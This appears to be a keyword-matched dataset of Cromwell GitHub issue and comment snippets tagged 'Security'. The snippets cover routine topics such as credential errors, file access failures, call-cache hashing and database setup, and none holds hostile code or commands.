cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncB,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4918:350,validat,validation,350,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4918,10,"['Validat', 'validat']","['ValidatedRuntimeAttributesBuilder', 'validation']"
Security,"From a quick reading of the parent `WorkflowManagerActor` code it appears the default supervision strategy with ""restart on generic Exception"" is being used. Simply restarting a crashed `WorkflowActor` FSM appears to put it back into its initial `WorkflowUnstartedState` where it wouldn't do anything to progress a workflow until it receives a `StartWorkflowCommand` which is not being re-sent. So it looks like this would create a zombie workflow, though it does appear to be abortable.; ```; ERROR akka.actor.OneForOneStrategy - Google credentials are invalid: Error getting access token for service account: 400 Bad Request; {; ""error"": ""invalid_grant"",; ""error_description"": ""Invalid JWT Signature.""; }; java.lang.RuntimeException: Google credentials are invalid: Error getting access token for service account: 400 Bad Request; {; ""error"": ""invalid_grant"",; ""error_description"": ""Invalid JWT Signature.""; }; 	at cromwell.cloudsupport.gcp.auth.GoogleAuthMode.validateCredentials(GoogleAuthMode.scala:175); 	at cromwell.cloudsupport.gcp.auth.GoogleAuthMode.validateCredentials$(GoogleAuthMode.scala:173); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.validateCredentials(GoogleAuthMode.scala:237); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.credentials(GoogleAuthMode.scala:250); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.credentials(GoogleAuthMode.scala:237); 	at cromwell.filesystems.drs.DrsPathBuilderFactory.withOptions(DrsPathBuilderFactory.scala:86); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.val",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4916:577,access,access,577,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4916,3,"['access', 'validat']","['access', 'validateCredentials']"
Security,"From both swagger & purely from command line verify that the following workflow (pardon the pun) works. If it does not, file tickets here or with Sam as appropriate. Create a doc detailing the outcome. - Perform OAuth authentication (via clicky buttons in swagger, gcloud on CLI); - Register user in Sam; - Submit workflow to Cromwell; - Get final results from Cromwell for that workflow",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2598:218,authenticat,authentication,218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2598,1,['authenticat'],['authentication']
Security,"From cromwell:; ```; ....snip....; java.lang.RuntimeException: Task 773d051e-2e93-4248-bca4-e40292e0e59d:generate_true_positives failed: error code 5. Message: 9: Failed to localize files: failed to copy the following files: ""gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list -> /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list (cp failed: gsutil -q -m cp gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list, command failed: AccessDeniedException: 403 Caller does not have storage.objects.list access to bucket firecloud-tcga-open-access.\nCommandException: 1 file/object could not be transferred.\n)""; at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:489); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:61); ....snip....; ```; ; BUT I would think this next operation would fail and it does not:; ```; lichtens@lichtens-big:~/test_dl_oxoq/create_bs$ gsutil ls gs://firecloud-tcga-open-access/tutorial/reference/; gs://firecloud-tcga-open-access/tutorial/reference/CNV.hg19.bypos.111213.txt; gs://firecloud-tcga-open-access/tutorial/reference/Homo_sapiens_assembly19.dict; gs://firecloud-tcga-open-access/tutorial/reference/Homo_sapiens_assembly19.fasta; gs://firecloud-tcga-open-access/tutorial/reference/Homo_sapiens_assembly19.fasta.fai; ```. and: ; ```; lichtens@lichtens-big:~/test",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1960:1163,Access,AccessDeniedException,1163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1960,1,['Access'],['AccessDeniedException']
Security,"From discussion yesterday it seems that this needs the metadata service to be implemented. There are three kinds of final calls:; - Copy workflow logs - this only needs access to filesystems in the engine. Log location is specified in the workflow options; - Copy workflow outputs - this needs filesystem access in the engine. Takes a sub-set of the call outputs and copies them.; - Copy call logs - Call logs can be different for each backend, and since this information is now being stored in the metadata service, we need some convention for which keys are valid call-log keys.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/773#issuecomment-218142957:169,access,access,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/773#issuecomment-218142957,2,['access'],['access']
Security,"From my testing, it seems that anything that runs a ""chmod""-like command disrupts the ACL-controlled permissions, leading to permission denied and/or other errors. I think if the configuration option wrapped any commands that did this, it would fix the issue. In the meantime I was able to come up with a few workarounds to fix the permissions so that we were happy with the system (moved some files around so cromwell wasn't accessing or trying to move anything past our ACL, and added a ""chmod o-wrx..."" command to my submit script), but a configuration option that did this by default would be great!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374703828:426,access,accessing,426,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374703828,1,['access'],['accessing']
Security,"From the docs, emphasis mine:. >After a successful complete request, the parts no longer exist. Your complete multipart upload request must include the upload ID and a list of both part numbers and corresponding ETag values. Amazon S3 response includes an ETag that uniquely identifies the combined object data. **This ETag will not necessarily be an MD5 hash of the object data**. [Source](https://docs.aws.amazon.com/AmazonS3/latest/dev/mpuoverview.html). Thinking out loud: Do we have to recreate the original multipart upload to get the same ETag deterministically? Or otherwise how can we get the combined ETag deterministically?. If not, we can use [UploadPartCopyRequest](http://aws-java-sdk-javadoc.s3-website-us-west-2.amazonaws.com/latest/software/amazon/awssdk/services/s3/model/UploadPartCopyRequest.html) to accomplish this [here](https://github.com/broadinstitute/cromwell/blob/b8aa5e1eee730dcd3edc2c8ff0cf0144127a3208/filesystems/s3/src/main/java/org/lerch/s3fs/S3FileSystemProvider.java#L433). [Example multipart copy using old SDK](https://docs.aws.amazon.com/AmazonS3/latest/dev/CopyingObjctsUsingLLJavaMPUapi.html); [Migration guide from 1.1 to 2.0 (to interpret above in 2.0)](https://github.com/aws/aws-sdk-java-v2/blob/master/docs/LaunchChangelog.md#41-s3-changes)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-483794865:355,hash,hash,355,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-483794865,2,['hash'],['hash']
Security,"From the point of view of the wider user community (which reaches far outside the Broad's walls), it would be difficult to justify (not to mention communicate and support) an implicit retry mechanism that would effectively override the request stated by the user in their WDL. So we would have to expose that second setting, but then that increases the technical complexity that we need to maintain and support as well. Additionally, this would be vulnerable to business decisions by Google -- for example, what if they change the no-charge duration cutoff in response to a sudden dramatic increase of retries on early-preemption jobs? . Generally speaking I believe the best thing we can do for the user community is provide a transparent way for people to understand what are the odds and tradeoff of preemption, and to control the setting depending on their time & cost constraints (ie how much they're willing to gamble).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293700592:297,expose,expose,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293700592,1,['expose'],['expose']
Security,"From user reports, this is upsetting cost estimation (and is scary anyway wrt re-writing history!. Needs validation and a reproducible case, but presumably something like:. - Run a long workflow, one shard fails; - Re-run the same workflow, most shard call cache; - The shards in the original workflow get updated to have the call-cache timings, rather than the original long timings.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4141:105,validat,validation,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4141,1,['validat'],['validation']
Security,From: #5464 ; Closes: #5460 . Recreated to be in the Cromwell repo with access to testing. Thanks @aednichols!,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5583:72,access,access,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5583,1,['access'],['access']
Security,"Full sketch of the idea as it applied to the pluggable_backends branch below. This particular ticket is concerned only with moving the DB code and having the engine be able to work with backends to determine which calls are resumable. Those might really be two separate pieces that two people could work in parallel. Cromwell would need to wake up and scan its database for Running workflows with Running calls. Something in Cromwell would then need to classify calls into resumable or not resumable. e.g. for JES, figure out if Cromwell has a JES Run ID that could be used to resume polling an already-launched JES run. Only the JES backend would know how to make this determination, but backends don’t have access to the database. So Cromwell would need to gather up representations of possibly resumable executions, examine on which backend type the executions had been running, create CallActors for each execution using a specified backend type (not a currently supported use case), and send a Restart message parameterized by the representation of the execution. The CallActor would need to create a backend of the specified type and then ask that backend if the execution is resumable. Resumable executions would result in a Resumed message making its way back to the WorkflowActor, otherwise WorkflowActor would get a NotResumable message. For NotResumable executions the WorkflowActor should be free to choose whatever backend it pleases to restart the call and shouldn’t necessarily be bound by the backend type that was chosen for the previous attempt.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/581#issuecomment-197643112:709,access,access,709,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/581#issuecomment-197643112,2,['access'],['access']
Security,"Function.scala:171); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171); at akka.actor.Actor$class.aroundReceive(Actor.scala:496); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:67); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); ... 5 more; Caused by: com.google.api.client.http.HttpResponseException: 500 Internal Server Error; {; ""error"" : ""internal_failure""; }; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1070); at com.google.auth.oauth2.UserCredentials.refreshAccessToken(UserCredentials.java:207); at com.google.auth.oauth2.OAuth2Credentials.refresh(OAuth2Credentials.java:149); at cromwell.filesystems.gcs.auth.GoogleAuthMode$$anonfun$validateCredential$1.apply$mcV$sp(GoogleAuthMode.scala:62); at cromwell.filesystems.gcs.auth.GoogleAuthMode$$anonfun$validateCredential$1.apply(GoogleAuthMode.scala:62); at cromwell.filesystems.gcs.auth.GoogleAuthMode$$anonfun$validateCredential$1.apply(GoogleAuthMode.scala:62); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.auth.GoogleAuthMode$class.validate(GoogleAuthMode.scala:65); ... 46 more. [INFO] [05/12/2017 21:47:03.777] [cromwell-system-akka.dispatchers.engine-dispatcher-7] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor WorkflowActor-6c383c35-d791-4971-aecd-0723726c8a7b is in a terminal state: WorkflowFailedState; ^C[INFO] [05/15/2017 14:06:33.456] [shutdownHook1] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor: Received shutdown signal.; [INFO] [05/15/2017 14:06:33.457] [cromwell-system-akka.dispatchers.engine-dispatcher-91] [akka://cromwell-system/user/cromwell-service/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2270:6346,validat,validateCredential,6346,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2270,1,['validat'],['validateCredential']
Security,Functionality added to localize WdlFile / WdlArray[WdlFile] cached results in HtCondor so in that way cached results are link to the new task. i.e.:; 1. w0/task1 execution produces w0/result1.; 2. w0/result1 is stored in the cache.; 3. w1/task1 (w1/task1 is the same as w0/task1) is executed again.; 4. Cache result is hit.; 5. File cached results are used to generate new symlinks to point to them in current task.; 6. Result is generated using new paths based on symlinks and/or other cached results. This change is based on new security/permissions requirements.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1424:531,secur,security,531,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1424,1,['secur'],['security']
Security,GCPBATCH: accessing private gcr.io docker for callcaching raises error: unauthorized,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:10,access,accessing,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['access'],['accessing']
Security,Generates call caching hashes,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1290:23,hash,hashes,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1290,1,['hash'],['hashes']
Security,Git hash: 3eb1623d9a5ffdf0fc3626820eab84ae6560b2cd,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197959558:4,hash,hash,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197959558,1,['hash'],['hash']
Security,"GitHub ""helpfully"" collapses `JsonEditorSpec` due to the scope of the changes, but actually that does need to be reviewed. 🙂 . Does:. * Fix `exclude` to only examine workflows and calls; * Support `:` syntax in excludes; * Add `ErrorOr` validation to method signatures; * ""Adjust"" `JsonEditorSpec` to not actively test for incorrect behavior. Does not:. * Fix `include` to only examine workflows and calls; * Support `:` syntax for include; * Add as many real-world or rigorous tests as I would like, mostly because the aforementioned things are still broken",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5309:237,validat,validation,237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5309,1,['validat'],['validation']
Security,"Give Centaur-managed Cromwell more time to restart and a custom exit code.; Publish artifacts again on each build tag.; Login to docker before trying to push images.; Functions using secure variables ensure that xtrace is not enabled, thus no longer need a subshell, thus do not need to be exported.; Artifactory and Docker Hub credentials added to vault.; Docker login can use environment variables or vault once dsde-toolbox is public.; Split setup_secure_environment into setup_common_environment and setup_secure_resources.; Sbt environment variables prefixed as CROMWELL_SBT_*.; Print out a warning instead of exiting when vault resources cannot be rendered when testing locally.; Minor updates for more consistent shell variable usage.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3661:183,secur,secure,183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3661,1,['secur'],['secure']
Security,Give a JES-pointing server a non-GCS url in the inputs file and the API gives no response. Looking in the server logs you get . ```; java.lang.IllegalArgumentException: Not a valid Google Cloud Storage URI: /Users/chrisl/Desktop/workflowTimings.html; at cromwell.engine.io.gcs.GcsPath$.parse(GcsPath.scala:32); at cromwell.engine.io.gcs.GcsPath$.apply(GcsPath.scala:22); at cromwell.engine.io.gcs.GoogleCloudStorage.hash(GoogleCloudStorage.scala:76); at cromwell.engine.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:62); at cromwell.engine.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:62); at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63); at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39); at cromwell.engine.WorkflowDescriptor.hash(WorkflowDescriptor.scala:176); at cromwell.engine.workflow.WorkflowActor$$anonfun$52.apply(WorkflowActor.scala:1050); at cromwell.engine.workflow.WorkflowActor$$anonfun$52.apply(WorkflowActor.scala:1049); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245); at scala.collection.immutable.Map$Map2.foreach(Map.scala:137); at scala.collection.TraversableLike$class.map(TraversableLike.scala:245); at scala.collection.AbstractTraversable.map(Traversable.scala:104); at cromwell.engine.workflow.WorkflowActor.buildSymbolStoreEntries(WorkflowActor.scala:1049); at cromwell.engine.workflow.WorkflowActor.createWorkflow(WorkflowActor.scala:241); at cromwell.engine.workflow.WorkflowActor$Start.runInitialization(WorkflowActor.scala:120); at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$initializeExecutionStore(WorkflowActor.scala:326); at cromwell.engine.workflow.WorkflowActor$$anonfun$1.applyOrElse(WorkflowActor.scala:364); at cromwell.engine.workflow.WorkflowActor$$anonfun$1.applyOrElse(WorkflowActor.scala:360); at scala.runtime.AbstractPar,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/520:416,hash,hash,416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/520,2,['hash'],['hash']
Security,"Given the following call to a sub-workflow in a larger workflow:; ```; call CNVOncotator.CNVOncotatorWorkflow as CNVOncotatorWorkflow {; input:; called_file = CallCopyRatioSegmentsTumor.called_copy_ratio_segments,; additional_args = additional_args,; oncotator_docker = oncotator_docker,; mem_gb_for_oncotator = mem_gb_for_oncotator,; preemptible_attempts = preemptible_attempts; }; }; ```. Even though `additional_args` and `mem_gb_for_oncotator` are not defined, this workflow still validates.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3230:485,validat,validates,485,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3230,1,['validat'],['validates']
Security,"Glad that helped !; Regarding HSQL vs MySQL, the main reason is that we've rarely used HSQL and there may be some corner cases that we don't support (and don't know about); It probably performs better too on the long run as your DB grows.; But it's definitely good to have some feedback on how Cromwell behaves with HSQL too.; For the `null` hash, something weird is going on so I'd keep the issue open. If it's not immediately blocking you anymore it might get slightly de-prioritized but we'll definitely look into it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386700970:342,hash,hash,342,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386700970,2,['hash'],['hash']
Security,Going with CircleCI instead because it gives us full VM access instead of starting us off in a container and forcing docker-by-docker or docker-in-docker solutions,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6089#issuecomment-777656264:56,access,access,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6089#issuecomment-777656264,1,['access'],['access']
Security,Going with changing Martha to try-and-silence accessUrl generation failures.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6319#issuecomment-825204463:46,access,accessUrl,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6319#issuecomment-825204463,1,['access'],['accessUrl']
Security,"Good news! @geoffjentry is wrong, and we do not hash the cpu or memory runtime attributes. So call caching works as you want it to. These runtime attributes are hashed (and count for call caching):; * `ContinueOnReturnCode`; * `Docker`; * `FailOnStderr`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-331260390:48,hash,hash,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-331260390,2,['hash'],"['hash', 'hashed']"
Security,Google Artifact Registry image hashing support [BT-335],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6436:31,hash,hashing,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6436,1,['hash'],['hashing']
Security,"Google JES backend: access to ""requester pays"" bucket",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2916:20,access,access,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2916,1,['access'],['access']
Security,"Got a centaur failure with `Failed to upload auth file` caused by the following exception, not considered retryable:. ```; 017-04-18 21:11:49,413 cromwell-system-akka.dispatchers.engine-dispatcher-64 ERROR - WorkflowManagerActor Workflow 6e23463e-3fc6-4b18-aeb0-fc7c920cd758 failed (during InitializingWorkflowState): Failed to upload authentication file; java.io.IOException: Failed to upload authentication file; 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.applyOrElse(JesInitializationActor.scala:63); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.applyOrElse(JesInitializationActor.scala:62); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.core.CromwellFatalException: com.google.cloud.storage.StorageExc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:335,authenticat,authentication,335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,2,['authenticat'],['authentication']
Security,"Great increasing the memory was the solution. In case somebody else needs helping setting up a mysql database:. 1. Add this to the bottom of your config; ```; database { ; profile = ""slick.jdbc.MySQLProfile$"" ; db { ; driver = ""com.mysql.jdbc.Driver"" ; url = ""jdbc:mysql://localhost/DatabaseName?useSSL=false&allowPublicKeyRetrieval=true"" ; user = ""ChooseAName"" ; password = ""YourOtherPassword"" ; connectionTimeout = 5000 ; } ; }; ```; 2. Then set up the mysql database using docker; ```; sudo docker run -p 3306:3306 -e MYSQL_ROOT_PASSWORD=YourPassword -e MYSQL_DATABASE=DatabaseName -e MYSQL_USER=ChooseAName -e MYSQL_PASSWORD=YourOtherPassword -d mysql; ```. 3. Then check that your docker container is running: ; ```; sudo docker ps -a; ```. 4. Then you should be all set. Most of this is from:; https://gatkforums.broadinstitute.org/wdl/discussion/comment/51170#Comment_51170",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5347#issuecomment-573160131:364,password,password,364,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5347#issuecomment-573160131,1,['password'],['password']
Security,"Great, thanks. I originally saw this issue when running a 20000-wide Hello World scatter using mock JES. At a point when Cromwell temporarily seemed catatonic, I Control-backslashed and saw loads of engine dispatcher stack traces like the above. Mock JES is currently [broken](#1571) due to batching API changes but hopefully it will become great again soon and the #1456 changes can be validated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-254582826:387,validat,validated,387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1445#issuecomment-254582826,1,['validat'],['validated']
Security,"H. On Fri, Feb 17, 2017, 10:58 AM Thib <notifications@github.com> wrote:. > ------------------------------; > You can view, comment on, or merge this pull request online at:j; >; > https://github.com/broadinstitute/cromwell/pull/2006; > Commit Summary; >; > - fail file hashing if the file does not exist; >; > File Changes; >; > - *M*; > supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala; > <https://github.com/broadinstitute/cromwell/pull/2006/files#diff-0>; > (17); >; > Patch Links:; >; > - https://github.com/broadinstitute/cromwell/pull/2006.patch; > - https://github.com/broadinstitute/cromwell/pull/2006.diff; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/2006>, or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AFIEGBYy1Z6suJGLDtusapP1VvcT0mSfks5rdcOhgaJpZM4MEbxA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280878369:270,hash,hashing,270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280878369,1,['hash'],['hashing']
Security,"Hah, you perturbed (WOTD) the hash, the test needs to be updated",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/332#issuecomment-165262625:30,hash,hash,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/332#issuecomment-165262625,1,['hash'],['hash']
Security,Handle null access token from Google Credentials,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2489:12,access,access,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2489,1,['access'],['access']
Security,Hash WdlValues,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/286:0,Hash,Hash,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/286,1,['Hash'],['Hash']
Security,Hash outputs with call caching,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1964:0,Hash,Hash,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1964,1,['Hash'],['Hash']
Security,"Hashes are busted in travis for some reason, but overall :+1: . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/616/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/616#issuecomment-201016504:0,Hash,Hashes,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/616#issuecomment-201016504,1,['Hash'],['Hashes']
Security,Hashing strategies v2 - Closes #1483,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1508:0,Hash,Hashing,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1508,1,['Hash'],['Hashing']
Security,Hashpocalypse postmortem,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3714:0,Hash,Hashpocalypse,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3714,1,['Hash'],['Hashpocalypse']
Security,Having a tail function in the array is very useful as it is quite common to read tsv files where first column is name of condition and others are sample accession numbers. I also opened a forum question on this http://gatkforums.broadinstitute.org/wdl/discussion/9893/getting-tail-of-the-array/p1?new=1,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2414:153,access,accession,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2414,1,['access'],['accession']
Security,"Hello @haaskyle, we are currently using Jira for our backlog. I have moved your ticket to https://broadworkbench.atlassian.net/browse/BA-5695. Please let me know if you have issues accessing it. You will need to create a Jira account. The priority of this ticket will be reviewed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-499991087:181,access,accessing,181,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5006#issuecomment-499991087,1,['access'],['accessing']
